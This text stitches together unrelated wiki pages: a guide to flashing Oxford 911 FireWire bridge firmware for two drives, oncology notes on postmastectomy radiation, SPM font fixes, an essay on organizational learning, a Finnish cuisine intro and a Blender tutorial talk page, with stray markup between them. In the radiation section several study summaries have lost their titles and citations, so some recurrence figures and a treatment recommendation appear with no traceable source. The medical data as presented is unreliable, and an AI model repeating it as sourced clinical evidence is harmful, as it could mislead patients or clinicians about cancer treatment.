#If you have decided to use one drive per enclosure, you’re done now. Just put your drives in the enclosures, daisy chain them together, create the array and you’re set. (Ok, that isn't a trivial matter, but this will be elaborated on later...)
#-This registry key does not appear to work under Windows 2000 SP5.

== Two drives per bridge/enclosure?? ==

It turns out it is possible to connect two drives in a master/slave configuration to each Oxford 911 bridge. That cuts down the cost, since you now have to buy half as many enclosures as you have drives.

# Go here: &lt;br&gt; http://www.fwdepot.com/firewiredepot/firmware/firmware.html
# Get updated firmware for your Oxford 911 chipset. &lt;br&gt; http://fwdepot.com/firewiredepot/firmware/FW911_V4_00_0000_Release.bin &lt;br&gt; The file is called: FW911_V4_00_0000_Release.bin
# Get the uploader tool which will allow you to flash the Oxford 911 bridge and tweak settings to enable the slave device. &lt;br&gt; http://fwdepot.com/firewiredepot/xp_updater_1_64.1.zip &lt;br&gt; You may also need JRE. Follow their instructions to get that.
# Start the uploader program and flash your Oxford 911 bridge to the latest firmware. 
#* I suggest you download and read the users guide for the Oxford Semiconductor software. It is helpful. &lt;br&gt; http://www.oxsemi.co.uk/cgi-bin/general/prodhome.cgi?911 - Link not available - Try &lt;br&gt; http://www.datoptic.com/PDF/Oxford_Semiconductor_Uploader_UG.pdf &lt;br&gt;
# Here is the main screen of the program: &lt;br&gt; http://web.archive.org/20090821071228/www.geocities.com/phrozenphreak2001/mainscreen.gif &lt;br&gt; Yours should look something like that after flashing. 
# Next, click on ‘Modify Configuration Information’. Enable the Slave details and fill in some values that might make sense. Set the device type for both Master and Slave to hard disk drive. &lt;br&gt; http://web.archive.org/20090820182840/www.geocities.com/phrozenphreak2001/modify_configuration_information.gif
# Click on 'advanced'. In there, enable all the UDMA modes for both the master and the slave. &lt;br&gt;http://web.archive.org/20090820163136/www.geocities.com/phrozenphreak2001/advanced_options.gif &lt;br&gt;Select the following options below the pull-downs: 
#* Enable GPI drive detect
#* Detect drives with non-std signature
#* Enable ATAPI UDMA on Master
#* Enable ATAPI UDMA on Slave 
# Do not select other options. Some of them may render your bridge useless. It may be recoverable, though. I killed mine at first, but then was able to recover it by reloading the firmware through the force-flash mode. See the users manual. 
# Ok. Once that’s done. Click OK. And click ‘Upload changes’ back at the 'Modify Configuration Information' screen.
# The bridge should upload the new changes and reboot.

== Minor Details that need to be worked out ==

I forgot to mention. How do you connect these drives? Well, you’ll need a standard 80-pin IDE cable that is capable of ATA/100. Use whatever you like. Set the drive at the end of the cable to be the MASTER and the drive in the middle to be the SLAVE. Don’t rely on CABLE-SELECT, it doesn’t work. Tried it.

Next big question. How do you mount and power these drives? They obviously won’t fit in the enclosure, so you’re on your own there. I haven’t gotten that far yet. I’m thinking of finding some case with a good power supply and pulling the bridge boards from the enclosures and using them separately. Anyway, that’s up to you.

== Disclaimer, again ==

'''The actions described here could damage your Oxford 911 enclosures, hard drives, Firewire controllers, motherboard, PC, maybe even burn your house down. ''Everything here is at your own risk!'' '''

I’m just saying it is possible and here are some hints.

This is all in development stage and will hopefully improve as I finish the project and get input from others.

&lt;big&gt;'''Postmastectomy Radiation Therapy'''&lt;/big&gt;


==Official guidelines==
*Please see the [[Radiation_Oncology/Breast/Guidelines|Breast Guidelines]] page


==Patterns of failure==
*With chemotherapy - LR for 4 or more positive LN: about 15-36%.  LR for T3 tumor: about 20-30%. (multiple papers)
*Postmastectomy RT reduces LR recurrence in high-risk group to about 5-10%.


===Overall===
*'''Florence, 2007''' (1971-2003) PMID 17368813 -- &quot;Loco-regional recurrence in 2064 patients with breast cancer treated with mastectomy without adjuvant radiotherapy.&quot; (Livi L, Eur J Surg Oncol. 2007 Mar 15)
**Retrospective. 2064 patients treated with mastectomy, without adjuvant RT
**Loco-regional failure: 18%; only prognostic factor tumor size, not number of LN+
**Conclusion: Number of LN+ not enough to justify adjuvant RT

*'''MDACC, 2005''' - PMID 16169678 &amp;mdash; &quot;Clinical investigation: regional nodal failure patterns in breast cancer patients treated with mastectomy without radiotherapy.&quot; Strom EA et al. Int J Radiat Oncol Biol Phys. 2005 Dec 1;63(5):1508-13. 
**Retrospective. 1031 patients treated with mastectomy + ALND and doxorubicin-based chemo. No RT. On 5 clinical trials. Median axillary LN dissected 17, but no cN2 disease. Median F/U 9.7 years
**10-year regional recurrence: axilla 3%, supraclav 8%
**Predictors for SCV failure: &gt;=4 LN+, &gt;20% LN+, gross LN ECE
**Conclusion: RT to axilla not necessary if ALND; RT to SCV if one of the risk factors

*'''NSABP pooled analysis, 2004''' - PMID 15452182 &amp;mdash; &quot;Patterns of locoregional failure in patients with operable breast cancer treated by mastectomy and adjuvant chemotherapy with or without tamoxifen and without radiotherapy: results from five National Surgical Adjuvant Breast and Bowel Project randomized clinical trials.&quot; Taghian A et al. J Clin Oncol. 2004 Nov 1;22(21):4247-54. Epub 2004 Sep 27.
**Included pts from B-15, B-16, B-18, B-22, and B-25. 90% had doxorubicin-based chemo. 
**At 10 yrs, 12.2% had isolated LRF, 19.8% had LRF with or without DF, and 43.3% had DF alone as a first event.  
**LRF (+/- DM) as a first event was 13% for 1-3 LN, 24.4% for 4-9 LN, and 31.9% for 10 or more LN.  For tumor &lt; 2 cm 14.9%, 2-5 cm 21.3%, and &gt;5 cm 24.6%. 
**Conclusion: recommend post-mastectomy XRT for large tumors and 4 or more LN.

*'''MDACC''' (1975-1994)
**Retrospective analysis of 1031 pts enrolled on prospective clinical trials. Pts treated with mastectomy, chemotherapy w/o tamoxifen, and without RT. Stage II-IIIA.

***Analysis of factors other than size and lymph node status that predict for increased risk of LRR. Multicentric disease defined as 2 or more separate areas of invasive carcinoma in more than one quadrant of the breast and separated by at least 4 cm. Multifocal disease defined as 2 or more areas within the same quadrant and/or separated by less than 4 cm.
***''Multicentric / Multifocal disease:'' pts with gross multicentric disease (clinically apparent, or seen on gross pathologic examination): LRR 37% vs 17% at 10 yrs. Pts with multifocal disease and those with microscopic multicentric disease did not have higher rates of LRR than those with unifocal disease.
***''LVSI:'' increased LRR 25% at 10 yrs.
***''Margins:'' positive or close (&lt; 5 mm) margins, LRR 45%
***Conclusion: Close or positive surgical margins, pectoral fascia involvement, clinical or gross multicentric disease, LVSI, and invasion of the skin or nipple predict for an increased risk of LRR in patients treated without RT.
**'''2000''' PMID 10920129 -- &quot;Locoregional recurrence patterns after mastectomy and doxorubicin-based chemotherapy: implications for postoperative irradiation.&quot; (Katz A, J Clin Oncol. 2000 Aug;18(15):2817-27.)
***10-yr rate of isolated LRR 4% (0 LN), 10% (1-3 LN), 21% (4-9), and 22% (10 or more). T-stage, tumor size, and &gt;= 2 mm extranodal extension predicted for LRR.
***''For pts with T1-T2 and 1-3 LN:'' pts with &lt;10 nodes examined, LRR 24% vs 11%. Tumor size &gt; 4cm or extranodal extension, LRR &gt; 20%.
***Conclusion: For pts with tumors &gt;= 4 cm or &gt;= 4 involved nodes, LRR is &gt; 20% and pts should be offered RT. Additionally, pts with 1-3 LN and large tumors, extranodal extension, or inadequate axillary dissection may benefit from RT.

*'''ECOG'''
**'''1999''' (1978-87) PMID 10561205 -- &quot;Locoregional failure 10 years after mastectomy and adjuvant chemotherapy with or without tamoxifen without irradiation: experience of the Eastern Cooperative Oncology Group.&quot; (Recht A, J Clin Oncol. 1999 Jun;17(6):1689-700.)
***2016 pts on 4 ECOG trials (E5177, E6177, E4181, E5181). Pts N+ and had mastectomy and chemo +/- hormones but without RT. 
***10-yr risk of LRF (with or without DF) was 12.9% (1-3 LN) and 28.7% (4 or more). Tumor size, number of involved LNs, ER-, and decreasing number of nodes examined were significant for increased risk of LRF. Pt age and menopausal status were not significant.
***Note: tables in paper give risk of isolated LRF, LRF, or DF only for each TNM category as well as by tumor size in cm and number of involved nodes.
***Conclusion: LRF is a substantial problem for node-positive pts treated with mastectomy + chemohormonal therapy
**'''1988''' (1978-82): PMID 3292711 &amp;mdash; &quot;Identification of a subgroup of patients with breast cancer and histologically positive axillary nodes receiving adjuvant chemotherapy who may benefit from postoperative radiotherapy.&quot; (Fowble B, J Clin Oncol. 1988 Jul;6(7):1107-17.)
***627 pts on ECOG trials (E5177, E6177). 225 pts had relapse at 3 yrs. In 31% of failures (11% of pts) the relapse was LR without DM. Pts with 4 or more positive LN or tumor size 5 cm or more are more likely to have a local failure.

===Node positive (1-3 LN+)===
*'''Taiwan''', 2002 (1991-98) - PMID 11958892 &amp;mdash; &quot;Locoregional failure of postmastectomy patients with 1-3 positive axillary lymph nodes without adjuvant radiotherapy.&quot; Cheng JC et al. Int J Radiat Oncol Biol Phys. 2002 Mar 15;52(4):980-8.
*'''British Columbia''', 2005 (1989-97) - PMID 15817335 &amp;mdash; &quot;Selecting breast cancer patients with T1-T2 tumors and one to three positive axillary nodes at high postmastectomy locoregional recurrence risk for adjuvant radiotherapy.&quot; Truong PT et al. Int J Radiat Oncol Biol Phys. 2005 Apr 1;61(5):1337-47.
**821 pts, pT1-2 with 1-3 LN positive, without RT. Systemic therapy in 94%. 
**median f/u 7.7 yrs. 10-yr isolated LRR 12.7% and LRR with or without simultaneous distant recurrence 15.9%. Risk of &gt;20% LRR for pts with 1-3 LN+ and one of the following: age &lt; 45, ER negative, medial location, &gt;25% nodes positive.

===Node negative===
*Data from EBCTCG (PMID 16360786) shows 5-year LR rate of 6% after mastectomy and axillary clearance (systemic therapy unspecified)
*Similarly, data from NSABP (PMID 16921044) shows 10-year LR rate of 7% after mastectomy and axillary clearance (systemic therapy in 75%)
*Data from the Danish trials (PMID 9395428, PMID 10335782) showed LRF rate of 17% and 23% respectively in patients not receiving PMRT. Because this figure is much higher than the EBCTCG and NSABP data, and because the LN axillary dissection is considered suboptimal, it is possible that some of these T3N0 patients were occult N+ (PMID 16921044)
*Based on EBCTCG results, RT decreases the 6% LR rate to 2%, for an absolute 4% gain in local control. There is no impact on 15-year BCA mortality, but there is an ''overall survival decrement'' associated with RT.
*Patients with T3N0 disease have historically (PMID 15667954) been treated with PMRT, but data now suggests that large tumors as a sole criterion probably do not require PMRT. LVI+ status however is an independent prognostic factor for LRF
*Conversely, patients with T1-2N0 disease have not historically been treated with PMRT, but combination of some factors (young age, LVI+, tumors &gt;2cm, and close margins) may increase LRF risk to 20-40%
*A meta-analysis from UK suggests that patients with two or more risk factors (LVI, Grade 3, T2+, close SM, or age &lt;50/premenopausal) should be treated with PMRT, since their LRR risk is &gt;= 15%

**Retrospective. 397 pts treated with MRM and no RT. 
***superficial margin: positive in 41 pts (10%) and close margin (&lt;2 mm) in 56 (14%). 
***deep margin: positive in 23 (6%) and close in 34 (9%).
**Median f/u 6.7 yr. 
**Margin status associated with time to isolated LRR. Positive margins: 5-yr LRR of 6.2%. Close margins: 1.5%. Negative margins: 1.9%. 
**Conclusion: &quot;Patients with positive mastectomy margins had a significantly higher rate of LRR than those with a close or negative margin. However, the absolute risk of LRR in patients with a positive surgical margin in this series was low, and therefore the benefit of postmastectomy radiation in this population with otherwise favorable features is likely to be small.&quot;

**Retrospective. 34 pts treated with MRM, tumor &lt; 5 cm, 0-3 LN, margins &lt; 1 cm, and no postoperative RT.
**5 chest wall recurrences (1 isolated, 1 with axillary recurrence, 3 with distant mets). Chest wall recurrence rate 9% 5-yr and 18% 8-yr. For patient age &amp;le;50, 28% vs 0% for age &gt; 50.
**The subgroup of patients age 50 or younger with T1-T2 tumor size and 0-3 positive nodes with a close (&lt;5mm) or positive margin are at high risk (28%) for chest wall recurrence and should receive chest wall irradiation.

===Overall===
*'''NSABP B-02''', 1970 (1961-68)
**1103 pts. All pts received radical mastectomy (Halsted). Until 1967, premenopausal pts randomized to 1 of 3 arms: post-op RT, triethylenethiophosphoramide (TSPA), or placebo. Institutions either randomized all postmenopausal women to 3 arms (as in premenopausal women) or they used a different scheme where only LN+ pts were randomized to 3 arms and LN- pts were randomized 1:1 between TSPA and 5-FU. After May 1967, placebo arm was dropped. 
***RT technique: used OLD radiation therapy equipment. Many were orthovoltage. Required at least 200 kV. Dose was 3500 Roentgens in 3 weeks up to 4500 R in 5 weeks. RT was to IMN, apex of axilla, and supraclavicular fossa only. They did not irradiate the chest wall or the whole axilla.

***Event free survival 25% vs 35% (RR=0.70;p=0.09), DFS 30% vs 48% (RR=0.63), survival free of isolated locoregional disease 74% vs 90% (RR=0.36), survival free of locoregional relapse before systemic 61% vs 87% (RR=0.32), systemic breast cancer free survival 31% vs 48% (RR=0.66), breast cancer specific survival 38% vs 53% (RR=0.67), overall survival 37% vs 47% (RR=0.73) (''all SS except as otherwise stated'').  Similar interaction for 1-3 LN and &gt;4 LN. 
***Of 39 pts with isolated locoregional recurrence, 37 developed systemic recurrence and died from breast cancer, despite salvage therapy.
***Arm edema in 3.2% vs 9.1% (severe in 3.7% vs 0.6%)
**Conclusion: Improved overall survival. Control of locoregional disease leads to improved survival.

==Indications for radiotherapy following neoadjuvant chemotherapy==
*Based on MD Anderson retrospective data (all patients treated with mastectomy + ALND)
**If no PMRT was given: 5-year LRR is 23%, with 15% being isolated first failure. In patients with pCR, LRR is 19% . Predictive factors were clinical Stage IIIB+ or pathological LN+ &gt;=4, or lack of tamoxifen use. Clinical T1-2 had LRR 4% vs. cT3-4 LRR 46% (SS). Clinical N0 had LRR 23% vs. N+ 27% (NS)
**When neoadjuvant patients without PMRT were compared to mastectomy only patients without PMRT by pathologic stage, neoadjuvant patients had significantly higher risk of LRR. When compared by initial clinical stage, the LRR was comparable
**PMRT was typically given for higher stage patients. Overall 10-LRR without PMRT was 22%, with PMRT (despite higher clinical stage) 11% (SS). Subsets of patients that gained significant benefit were clinical T3, clinical Stage III-IV, and pathological &gt;=4 LN+
**For patients who achieve pCR after neoadjuvant chemo, there is no benefit for PMRT in clinical Stage I-II, but dramatic benefit in clinical Stage III-IV for LRR (7% vs. 33%), DMFS, DSS, and OS with the addition of PMRT 
*Two two major Phase III US neoadjuvant chemo trials ([[Radiation_Oncology/Breast/Breast_chemotherapy#Neoadjuvant_chemotherapy|NSABP B-18 and NSABP B-27]]) which enrolled patients with cT-3N1 patients (no fixed LNs) did not allow post-mastectomy RT


'''''Recurrence after neoadjuvant chemotherapy &lt;u&gt;without&lt;/u&gt; PMRT'''''
*'''NSABP'''
**3088 pts. Combined analysis of NSABP B-18 and B-27. Neoadjuvant chemotherapy was either AC alone or AC + Taxane. Pts treated with mastectomy did not receive PMRT. Lumpectomy pts received adjuvant RT.

***335 LRR events after 10 yrs f/u. In mastectomy pts (treated w/o RT), 10-yr cumulative LRR 12.3%. In lumpectomy pts (+RT), LRR 10.3%.
***Predictors of LRR. In lumpectomy pts -- age, clinical N-stage (before neoadj chemo), pathologic nodal status / breast tumor response.  In mastectomy pts -- clinical tumor size (before neoadj chemo), clinical N-stage (before chemo), and pathologic nodal status / breast tumor response.
***Defined groups at low, intermediate, and high risk of LRR after neoadjuvant chemotherapy.
***Conclusion: &quot;In patients treated with NC, age, clinical tumor characteristics before NC, and pathologic nodal status/breast tumor response after NC can be used to predict risk for LRR and to optimize the use of adjuvant radiotherapy.&quot;

***Outcome: 10% pCR, pN0 41%. Overall recurrence 47%; LRR 23% (15% isolated first failure) and DM 42%. OS at 5-yr 57% and 10-yr 40%.
***5-year LRR rates: 
****Clinical stage: ''cT-stage:'' cT1 0%, cT2 12%, cT3 25%, cT4 51%. ''cN-stage:'' cN0 23%, cN+ 27% (NS). However, higher LRR for advanced N-stage (N2-3 vs. N0-1). 
****Pathologic stage: ''pT-stage:'' ypT1 18%, ypT2 36%, ypT3-4 46%. ''pN-stage:'' (0 LN, 12%; 1-3, 18%; 4-9, 57%; &gt;10 no 5-year survivors). ''pCR:'' 19% vs. pPR 28% (NS, but small numbers). ''Use of tamoxifen:'' 7% vs 36%.   
****Nodal status: cN0 and pN0 3%, cN+ and pN0 14%, cN0 and pN+ 63%, cN+ and pN+ 32% (wide confidence intervals)
***3 factors associated with LRR: 1) clinical stage IIIB+ (cT4 or cN3=SCV/IM LN+) (HR 4.5), 2) &gt;=4 positive LN (HR 2.7), and 3) lack of tamoxifen use (HR 3.9). No clear relationship between disease response to chemo and LRR. LRR 46% for cT3-4 vs 4% for cT1-T2.
***Conclusion: Both clinical (pre-neoadjuvant chemo) and pathologic factors impact risk for LRR

***8135 pts; 22 trials of +/- RT to chest wall and regional lymph ndoes. 
***For pN0(n=700), RT had no effect on LRR, overall recurrence, or BCSM.
***For pN+(1-3 nodes)(n=1314), RT reduced LRR (3.8% vs 20.3%), overall recurrence (RR 0.68), and BCSM (RR 0.80). 
***For pN+(4+ nodes)(n=1772), RT reduced LRR (13.0% vs 32.1%), overall recurrence (RR 0.79), and BCSM (RR 0.87). 
***Conclusion: &quot;After mastectomy and axillary dissection, radiotherapy reduced both recurrence and breast cancer mortality in the women with one to three positive lymph nodes in these trials even when systemic therapy was given. For today's women, who in many countries are at lower risk of recurrence, absolute gains might be smaller but proportional gains might be larger because of more effective radiotherapy.&quot;

**Retrospective. 229 LRR/1500 MDACC patients and 66 LRR/318 BCCA patients. Evaluated outcomes depending on whether PMRT was given or not
**Outcome: If LRR, 10-year OS PMRT- 34% vs PMRT+ 19% (SS); however, PMRT+ patients developed more mets prior to LRR (34% vs 63%), and had higher TN stages. However, if isolated LRR, no difference in DM and OS
**Conclusion: Irradiation does not promote biologically aggressive local recurrence</text>

__NOTOC__  __NOEDITSECTION__
==SPM-FONT-FIXES==
Some users may experience problems with fonts being too small. This entry is a compilation of suggested fixes.

'''Note:''' Some of these these fixes may work on some platforms and not others. You may have to combine several fixes.


&lt;h4&gt;Fix #1&lt;ref&gt;{{Citation |author=Darren Gitelman |date=26/10/2004 |ref=Gitelman2004}}&lt;/ref&gt;&lt;/h4&gt;
This fix has worked on some Windows machines, but does not resolve all problems.

#Open spm.m
#*This file is generally located under ~/spm8/spm.m on *NIX systems, and under C:\spm\spm8\spm.m on Windows
#On or around line 631 replace:
    if nargin&lt;2, FS=1:36; else FS=varargin{2}; end
with:
    if nargin&lt;2, FS=2:36; else FS=varargin{2}; end


&lt;h4&gt;Fix #2&lt;ref&gt;{{Citation |author=Joel Winston |ref=Winston}}&lt;/ref&gt;&lt;/h4&gt;
#Open spm.m
#*This file is generally located under ~/spm8/spm.m on *NIX systems, and under C:\spm\spm8\spm.m on Windows
#On or around line 636 replace:
    sf  = offset + 0.85*(min(spm('WinScale'))-1);
with:
    sf  = offset - 0.85*(min(spm('WinScale'))-1);
*You may also try to change 0.85 to a slightly smaller number.

Combining Fix #1 and Fix #2 may resolve the problem in some situations.&lt;ref&gt;{{Citation |author=Marco Tettamanti |date=28/10/2004 |ref=Tettamanti2004}}&lt;/ref&gt;


&lt;h4&gt;Mac specific fix&lt;/h4&gt;
If you are using a Mac open up the spm.m file as indicated above, scroll to line 664 and replace
    offset     = 1;
with:
    offset     = 1.4;
and this will solve all your font issues.

Other suggestions for font and display issues have included turning on the Graphics window resize property and viewing the output after printing to a ps file.&lt;ref&gt;{{Citation |author=Darren Gitleman |ref=Gitleman}}&lt;/ref&gt;

== Systems Learning ==

Systems Learning is a complex concept that involves understanding and gathering information about systems that entail small organizations all the way up to global entities.  Systems learning can be placed beside the term organizational learning and has been more evident in recent knowledge management research. This subject encompasses a variety of disciplines such as mathematics, physics, engineering, as well as, sociology and economics.  Most research has experimented with organizational learning only on one specific discipline and has not taken it to the next level by using it with other known models.  This curriculum diversification has hindered an accurate definition of organizational learning. Several meanings exist which some stand out in the research than others. One definition expressed by popular researchers is “it is undertaken by members of an organization to achieve organizational purposes, takes place in teams or small groups, is distributed widely throughout the organization, and embeds its outcomes in the organization’s system, structures and culture (Synder and Cummings, 1998).  Since there is no hard evidence of what really goes on in an organization, it is difficult to state whether organizational learning is a reality for the organization.  The traditional view of learning in an organization involves informal processes. Today, organizational learning is more structured, as employees are expected to direct and inform in a way that is highly correlated to work performance.  Argyris and Shcon are the two pioneers of organizational learning who brought forth the sociocultural approach and described it as “the growth of a culture of open communication, in which members of an organization collaborate in ‘organizational enquiries’ to discover better ways of achieving the organizations purpose”(Borham and Morgan, 2004). 

== Systems Dynamics ==
 
Systems dynamics suggest that learning is a process that can be acquired through making choices and learning from them.  By learning from your mistakes an individual can grow and become more able to adapt to certain circumstances.  Since systems dynamics experiment with models that can only imitate reality, it is hard to create an experimental environment to enable a successful learning atmosphere. Some say that there is an underlined political dynamics influence that cannot be ignored by organizational learning.  The works of Crossan, Lane and White (1999) developed a model of organizational learning, which involves a four-step process.  The 4I process starts with individual learning and then graduates to group learning which ends up with organizational learning.  Crossan’s four processes included in this model are intuiting, interpreting, integrating, and institutionalizing.  Intuiting by Crossan is defined as, “the preconscious recognition of the pattern and/or possibilities inherent in a personal stream of experience” (1999:525).  Intuiting starts with the individual where they learn from their experiences and then use these experiences for future mental models.  Interpreting is explained by Crossan as, “the explaining of, through words and/or actions, of an insight or idea to one’s self and to others” (Crossan 1999:525).  Interpreting allows one to map out ideas to use in external domains.  Group level starts at the interpreting process and is explained as, “the process of developing shared understanding among individuals and of taking coordinated action through mutual adjustment” (Crossan 1999:525).  The victory of collective behavior and action is the group feel of interpretation.  Institutionalizing is described by Crossan as, “systems, structures, procedures and strategies” (Crossan 1999:525) that is the core piece of organizational learning. A learning loop begins to form with the involvement of these four processes and take hold of the organizational learning entity.  The transformation into the institutional element of organizational learning has a definite political component as individuals deal with power in an organization and how ideas are reflected through this underlying element.

[[Image:LocationFinland.png|right]]

'''Finnish cuisine''' is generally healthy, thanks in part to wholemeal products ([[Cookbook:Rye|rye]], [[Cookbook:Barley|barley]], [[Cookbook:Oats|oats]]) and berries (such as [[Cookbook:Blueberry|blueberries]], [[Cookbook:Lingonberry|lingonberries]], [[Cookbook:Cloudberry|cloudberries]], and [[Cookbook:Sea Buckthorn|sea buckthorn]]). Traditionally families gather berries from forests in the autumn. Various [[Cookbook:Turnip|turnip]]s were common in older cooking, but these were largely supplanted by the [[Cookbook:Potato|potato]] when it was introduced in the 18th century.

The Finnish cuisine combines traditional country fare and upper-class cuisine with modern continental style cooking. Spices have been adopted from West and East. Finnish cuisine is pleasing to the eye and the taste buds and has something special for every month of the year.

[[Cookbook:Fish|Fish]] and [[Cookbook:Meat and poultry|meat]] play a prominent role in any traditional Finnish dish, vegetarianism being historically non-existent.

In the new Finnish kitchen, dishes are lighter, smaller and generally contains several different vegetables. This mode of cooking is highly influenced by [[Cookbook:European cuisines|European]] and American cuisine.

      <text xml:space="preserve">With all respect to the contributors to this book, [http://mediawiki.blender.org/index.php/Manual/Manipulators the manual mainained at blender.org] was a real relief after reading the confusing stuff and blog-like notes in this chapter.

on Placing the 3d cursor:  The exercise at the end:  after putting the cursor inside the camera, I can't get it back in the cube.  Every time I click within the cube, it de/selects it.  How to manipulate only the cursor and not select the cube?

Once a long time ago in a galaxy far far away, mouse pointers has three buttons. What do you do if you have no MMB?

: Your input is valid and adding more information for users of two button mice is definately in the works.  However, instead of providing feedback like this, please just add whatever you think needs to be added.  That's the whole point of a wikibook!  --[[User:Spiderworm|Spiderworm]] 22:08, 12 Mar 2005 (UTC)

Some people have &quot;scroll&quot; wheels rather than than MMBs. Maybe some instructions for us as well? I've added the stuff for pan-up/pan-down- [[user:Borisblue]]

== Rotating ==

It would have saved me a bit of googling if it was pointed out the SHIFT-F to enter &quot;Camera Fly Mode&quot; only works in &quot;Object Mode&quot;... in &quot;Edit Mode&quot; it appears to do nothing... Thanks!

== Placing 3D cursor ==

*With all due respect to all contributors to this great work. Is it possible to remove all the 'Another reader' and 'Yet another reader' notes? The original author was only trying to illustrate a point (although it was more about different respective editing plan than 3d cursor). All these readers'  notes are only making it more confusing and out of focus (and making me tired from reading them...) -- Webber 15:48, 08 Mar 2007 (EST)

** I've put the added notes in a nice little box off to the right, so they are clearly not part of the body text --[[User:68.6.52.59|68.6.52.59]] 04:28, 9 May 2007 (UTC)

*** I think this is the right move, until the exercise has been reworded or clarified. For me the challenge was remembering to deselct the cube first before trying to place the 3D cursor back into the cube. The most effective method IMO was to use AKEY to deselect everything. '''However''' this presupposes knowledge of selecting and deselecting, which has not yet been covered if you read the tutorial in sequence (I believe). I would recommend partially re-sequencing to have a short tutorial on selecting and deselecting. Does it make sense to talk about selecting first? [[User:Garmon Sutrix|Garmon Sutrix]] 15:27, 15 May 2007 (UTC)

**** About having people press the &quot;a&quot; key to solve their dilemma, we haven't gotten to selecting and deselecting yet. I agree with the above person, and I believe we need to try to keep everything as organized as possible (especially near the beginning), and that includes separating the tutorial of selecting with the tutorial of using the cursor. The same goes for telling people to turn off the 3D transform manipulator. It should not only be saved for another time, but will only cause more confusion later on when they don't turn it back on. Instead of reorganizing the whole thing and muddling things up, I'm going to change the instructions to, on the 3D view header, go to ''Object &gt; Snap &gt; Cursor to selection''. We've covered the header and navigating menus, and it fits neatly in the section. We don't need that junk that gets in the way of instructing them to do it and explaining its difficulty.

== Buy one ==

They are pretty cheap. There are modifier keys, such as shift, alt, and ctrl, also try reading the blender help for information on which do what.

== shift+scroll on ibook with scroll wheel mouse. ==

the whole SHIFT+Scroll to pan up and down does not seem to work on my ibook with a logitec mouse with a scroll button that seems to work dandy.  any ideas?  thanks.
CTRL-scroll to pan left and right works great though.

== 3D cursor ==

Anyone know how to set 3D cursor in XYZ (0, 0, 0)? I mean not with mouse clicking, but by numerical way or some shortcut. --[[User:Popski|Popski]] 11:25, 12 Jun 2005 (UTC)

: I found it. '''SHIFT-CKEY'''
:: YAY!!

== Rotation MMB / Rotation around what point? ==

It's not clear how to get some control over what point you are orbiting when you use the MMB.  When I'm building, I would like to have the mmb function orbit the object but i have no idea how.
:: Agree to this [[Special:Contributions/85.177.158.59|85.177.158.59]] ([[User talk:85.177.158.59|talk]]) 14:04, 14 January 2009 (UTC)

:: This is done with the use of NUM. which will adjust the view rotation centre to the selected object, while remaining in global view (ie. all other objects remain visible.) 16:02, 28 November 2009 (UTC)

&quot;The object the viewport orbits around (the object you see) can be changed to a new object by first selecting it with the RMB and then pressing NUM/&quot; This is too advanced for the tutorial.  I have just one object a box and i have no motivation to move the camera yet.
::Yes, this is a cool hint, the mode is called LOCAL VIEW. But then, all other objects are hidden. Thats not what i need, but it's a step towards it. I might be simple minded, but when i model, i need to orbit (pan&amp;zoom without roll) around selected parts AND see all neighbourhood.[[Special:Contributions/85.177.149.254|85.177.149.254]] ([[User talk:85.177.149.254|talk]]) 13:57, 15 January 2009 (UTC)
::OK, found it. For this, in the Buttons Window &quot;View Rotation&quot; the modes &quot;Turntable&quot; and &quot;Around Selection&quot; have to be switched on, e.g. &quot;be darkened&quot;. I prefer this very easy mode for simple and fast checks on correct modeling. [[Special:Contributions/85.177.149.254|85.177.149.254]] ([[User talk:85.177.149.254|talk]]) 14:25, 15 January 2009 (UTC)

&quot;In Blender there is a big difference between the number keys on your numberpad (numpad) and the number keys along the top of the keyboard. For example, NUM7 refers to the number 7 on the numberpad, while 7KEY refers to the number 7 that's above the YKEY and UKEY on the standard US keyboard.&quot;  This has already been explained and it's not Rotation specific.

IMHO, this point should be flattened, too. There are many things that don't have to do with rotation at all, eg. Numpad 1,3,7 where this should be explained separatedly and earlier.[[Special:Contributions/85.177.158.59|85.177.158.59]] ([[User talk:85.177.158.59|talk]]) 14:04, 14 January 2009 (UTC)

== num-period ==
It's not really completely clear which key is meant with ''NUM-period''. Firstly, the use of the hyphen is inconsistent (NUM1 to NUM9 don't have a hyphen) and secondly, other keyboards don't have a period there but a comma or perhaps something else.

''Indeed, I was on my way in to mention that NUM and NUM were mentioned twice, thinking the period and comma were simple punctuation.'' [[User:DavidJaquay|DavidJaquay]] 23:21, 8 May 2006 (UTC)

== Camera navigation. ==

Hope I'm not missing something obvious, but it seems to be a mystery how one can navigate in the camera view; i.e. pan, dolly, etc by moving the camera itself. Using  controls described in the article of course just take one to a new viewpoint (user) without altering the postion or orientation of the camera.

I'm having the same problem --[[User:Wladston|Wladston]] 13:41, 15 January 2006 (UTC)

to pan the camera you can just select it (by rightclicking the black border) while your in camera view (numpad 0) and push g to move it.  you can also tilt it with r but I don't know about rotating it up and down or side to side.

::Camera Navigation is outside of the scope of this section.  I'm glad you got assistance, but the order in which you learn these things is intended to assist you in learning new items. A strong point needs to be made that this section is focusing on the user view, and not the camera's view.  I'm a noob here, but I trust that's being left to a later section. --[[User:Deadguy|Deadguy]] ([[User talk:Deadguy|talk]]) 20:29, 24 August 2009 (UTC)

== Selecting all layers ==

My backtick key doesn't seem to do anything - selecting all layers **appears** to be my single-quote key, 'KEY. I'm hesitant to edit the page because it explicitly says that it's /not/ the single-quote key.. but that's what's working for me. I'm using a UK keyboard; the single-quote button shares the key with @, and is to the left of # (and ~) which is to the right of Return. Should the page be fixed, or is my install behaving weirdly?

On German Keyboard the &quot;toogle all visible&quot; key is ö (o with umlaut) on version 2.49b-win64 of blender.

== Re: Selecting all layers ==

My backtick key '''does''' select all layers (US keyboard).  Perhaps it is just the mapping on your UK keyboard.

== Panning the View ==

&quot;To pan is to move the camera&quot;  To my understanding, panning does not move *the* camera.  It just changes your view in the 3D View.

The segment that states:
&quot;You also have choice of keyboard alternatives:

          CTRL+NUM8                       Up
CTRL+NUM4           CTRL+NUM6       Left      Right
          CTRL+NUM2                      Down

Panning is an important skill to master; try it now.&quot;

The Up Left Right Down part is not clear if i should be in the Numpad or in the arrows left of it.

== Readers' Comments ==

The insertion of readers' comments in line with the main text makes things confusing. Comments need to be made slightly separate from the main text. One possible way might be to indent all comments.

Reply: There's no need for comments in the text. Comments are to be in the discussion page, I think.
[[User:Sevcsik|Sevcsik]] 18:11, 20 March 2007 (UTC)

== Removed discussions ==

I removed a discussion from the &quot;Adding and Deleting Objects&quot; part:

